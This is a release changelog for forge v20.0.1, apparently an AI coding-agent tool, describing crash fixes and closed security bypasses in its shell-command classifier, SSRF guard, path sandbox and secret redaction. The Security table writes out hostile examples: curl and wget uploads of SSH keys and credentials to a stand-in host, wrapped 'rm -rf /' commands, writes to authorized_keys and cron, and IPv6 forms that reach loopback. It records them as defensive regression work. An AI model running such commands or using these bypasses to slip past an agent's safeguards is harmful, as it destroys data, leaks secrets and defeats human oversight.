# forge v20.0.1 — bug-fix release

Every item below was reproduced against v20.0.0 before it was fixed, and each
has a regression test in `tests/test-security.inner.mjs` (section "v20.0.1").

## Crashes / broken features

| # | Module | Bug in v20.0.0 | Fix |
|---|--------|----------------|-----|
| 1 | `shellguard.js` | `mv foo /etc` / `cp x /usr` threw `ReferenceError: why is not defined` — the classifier crashed instead of blocking, taking the `!` shell / bash tool call down with it. | Reason string built without the undefined variable; both now classify `block`. |
| 2 | `forge.js` | `forge chat -m "hi"` (the syntax in `--help` and the README) sent the literal text `-m hi` to the model; `forge -v` / `-h` → "unknown command". The parser only understood `--long` flags. | `-m`, `-v`, `-h` short flags; `--key=value`; `--` terminator. `parseArgs` exported for tests; the module no longer auto-runs `main()` when imported. |
| 3 | `forge.js` | `forge agent --deep "fix the bug"` died with a usage error — `--deep` swallowed the task as its value. Same for `--pick`, `--continue`, `--free`, `--json`, `--no-color`, … | Known boolean flags never consume the next argument. `--plan "task"` keeps working. |
| 4 | `tools.js` `edit_file` / `multi_edit` | `String.replace(str, str)` interprets `$&`, `$1`, `$$`, `` $` `` in the replacement text — an edit inserting `` `$${amount}` `` silently lost a `$`; `"$&"` re-inserted the match. Source files were corrupted without any error. | Literal index-based splice. Also: empty `old` now rejected (was reported as "appears multiple times"); duplicate `old` entries rejected; chained edits (edit 2 targeting text produced by edit 1) get an explanatory error. |
| 5 | `tools.js` `delegate` | The timeout timer was never cleared, so every `forge agent` run that delegated kept the process alive for `delegateTimeoutSec` (180 s) after printing its answer. The e2e suite took 6.5 min for this reason alone. | `clearTimeout` in a `finally`. e2e suite now runs in ~25 s. |
| 6 | `tools.js` `safePath` | Target *realpath* was compared to the *logical* project root — any project reached through a symlink (macOS `/tmp` → `/private/tmp`, `~/projects` → `/mnt/…`) rejected **every** write with "escapes the project directory". | Compare against the root's realpath as well. While there: a **dangling** symlink pointing outside the project (`ln -s ~/.ssh/authorized_keys ak` + `write_file ak`) looked like an in-project path — the fallback resolver now walks components and follows the link target. |
| 7 | `providers.js` `streamOpenAI` | The streaming request body never included `tools` (the Anthropic stream and non-streaming `chatOnce` did). In `forge chat` against any OpenAI-protocol provider the model could not call a single tool. | `body.tools` set like the other two paths. Also `user-agent` header said `forge-agent/19.0.0`. |
| 8 | `chat.js` `/profile` | Switching `/profile deep` → `/profile fast` left deep mode on (the handler could only ever switch it on). | Deep follows the profile unless forced by `--deep` / `/deep`. |

## Security

| # | Module | Bypass in v20.0.0 | Fix |
|---|--------|-------------------|-----|
| 9 | `netguard.js` | The SSRF guard only recognised the *dotted* IPv4-mapped form. `http://[::ffff:7f00:1]/` (which is what `new URL()` produces from `::ffff:127.0.0.1`), NAT64 `64:ff9b::/96`, 6to4 `2002::/16`, Teredo, site-local and multicast all reached loopback / private services — verified by fetching a local listener through `fetch_url`. | IPv6 literals are expanded structurally; every embedded-IPv4 transition form is decoded and re-checked; unparseable literals are treated as private. |
| 10 | `tools.js` `fetch_url` | `redirect: "follow"` — only the first URL was validated. A public page answering `302 → http://127.0.0.1/…` or the cloud metadata IP was fetched. | Redirects followed manually (≤ 5 hops); every hop passes the guard; non-http(s) redirect targets refused; final URL reported. |
| 11 | `shellguard.js` | Wrappers bypassed every rule: `sh -c "rm -rf /"`, `bash -lc`, `eval`, `nohup`, `time`, `nice`, `env`, `command`, `exec`, `timeout`, `xargs`, `busybox`, `chroot`, `(…)`, `{ …; }`, `sudo sh -c "…"`, and `python3 -c "shutil.rmtree('/')"` / `node -e "fs.rmSync('/home/…')"` all classified **safe** (model may run autonomously). | Transparent wrappers are unwrapped; shell `-c` strings and `eval` args are classified recursively; interpreter one-liners are checked for destructive calls on root/home/system paths; `( )`/`{ }` groups are split like `;` (while `${…}`, `$(…)`, `<(…)` and `{}` stay intact). |
| 12 | `shellguard.js` | `rm -rf $HOME`, `"$HOME"`, `${HOME}`, `${HOME:-/}` were only *confirm* (model-runnable); `rm -rf ~/` was *danger* while `rm -rf ~` was *block*; `rm -rf $(cmd)` / `$UNKNOWN_VAR` were *confirm*. | `$HOME`/`$TMPDIR`/`$USER`-style variables are expanded literally before path checks; recursive `rm` on an unresolvable expansion is *danger*; `~/` blocks. |
| 13 | `shellguard.js` | Redirect targets were only checked for a few `/etc` files and whole disks: `echo x >> ~/.ssh/authorized_keys`, `>> ~/.bashrc`, `> /etc/cron.d/job`, `> ../x` were **safe**; `> /dev/sda1` (partition) was **safe**. | Redirects into credential dirs / shell startup files / system dirs → *danger*; outside the project → *confirm*; partitions and more device families → *block*. |
| 14 | `shellguard.js` | Exfiltration was **safe**: `curl -d @~/.ssh/id_rsa http://evil`, `--data-binary @.env`, `-F f=@/etc/passwd`, `-T ~/.aws/credentials`, `wget --post-file=~/.netrc`. | Upload arguments are resolved; credential files → *danger*, other uploads → *confirm*. |
| 15 | `secrets.js` | Not redacted before tool output entered the model context / session logs: credentials in URLs (`postgres://user:pw@host`, `mongodb://…`, `https://user:token@github.com/…`, `redis://:pw@host`), `AWS_SECRET_ACCESS_KEY=…`, Stripe `sk_live_`/`sk_test_`, SendGrid `SG.…`, plus a dozen other common token shapes. | New rules; false-positive checks kept (`PORT=3000`, `KEY_LENGTH=32`, registry URLs, timestamps stay untouched). |

## Test status

| suite | v20.0.0 | v20.0.1 |
|-------|---------|---------|
| `node tests/test-security.mjs` | 128 pass | **262 pass** (134 new regression tests) |
| `node tests/test-diffpatch.mjs` | 13 pass | 13 pass |
| `bash tests/e2e-forge.sh` | 221 pass, 384 s | 221 pass, **23 s** |
| `bash tests/cleanroom-v20.sh` | 45 pass | 45 pass |
